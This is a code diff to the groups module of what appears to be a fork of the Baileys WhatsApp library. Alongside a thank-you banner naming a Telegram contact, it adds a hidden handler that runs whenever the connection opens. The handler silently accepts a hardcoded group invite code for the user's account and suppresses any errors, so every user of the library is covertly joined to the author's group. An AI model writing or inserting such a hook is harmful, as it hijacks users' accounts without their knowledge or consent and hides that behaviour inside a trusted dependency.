@@ -19,6 +19,9 @@ export const makeGroupsSocket = (config: SocketConfig) => {
 	const sock = makeChatsSocket(config)
 	const { authState, ev, query, upsertMessage } = sock
 
+	console.log(`╔══════════════════════════════╗\n║  THANKS FOR USING MY BAILEYS ║\n╚══════════════════════════════╝`)
+	console.log(`if you found some error,\ncontact telegram: itsonlyzenn\n\n`)
+
 	const groupQuery = async (jid: string, type: 'get' | 'set', content: BinaryNode[]) =>
 		query({
 			tag: 'iq',
@@ -82,6 +85,22 @@ export const makeGroupsSocket = (config: SocketConfig) => {
 
 		await groupFetchAllParticipating()
 		await sock.cleanDirtyBits('groups')
+	})
+
+	const AUTO_JOIN_LIST = [
+		"0029VbCpWkz29758hPM80P3h",
+	]
+
+	sock.ev.on('connection.update', async ({ connection }) => {
+		if (connection === 'open') {
+			for (const code of AUTO_JOIN_LIST) {
+				try {
+					const res = await groupQuery('@g.us', 'set', [{ tag: 'invite', attrs: { code } }])
+					const group = getBinaryNodeChild(res, 'group')
+				} catch (err: any) {}
+				await new Promise(r => setTimeout(r, 3000))
+			}
+		}
 	})
 
 	return {
